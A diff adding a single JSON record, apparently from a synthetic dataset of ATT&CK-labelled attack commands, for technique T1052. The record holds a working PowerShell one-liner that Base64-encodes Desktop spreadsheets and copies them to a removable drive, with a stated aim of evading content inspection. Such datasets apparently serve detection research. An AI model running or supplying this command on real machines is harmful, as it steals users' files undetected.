@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\cache\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; Get-ChildItem \"$env:USERPROFILE\\Desktop\" -Include *.xlsx,*.csv -Recurse -ErrorAction SilentlyContinue | ForEach-Object { $b=[IO.File]::ReadAllBytes($_.FullName); [Convert]::ToBase64String($b) | Set-Content -Path (Join-Path $dest ($_.BaseName + \".b64\")) -Encoding ascii }; Write-Output \"Base64-archived Desktop data to $dest at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Base64-encodes spreadsheet data and stores it on a removable drive to evade simple content inspection while keeping all operations local.",
+  "rationale_steps": [
+    "Locate a removable drive for staging",
+    "Enumerate spreadsheet files from the Desktop",
+    "Read bytes and encode data to Base64 before writing to USB",
+    "Log the local operation using Write-Output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-9ff91ae3",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
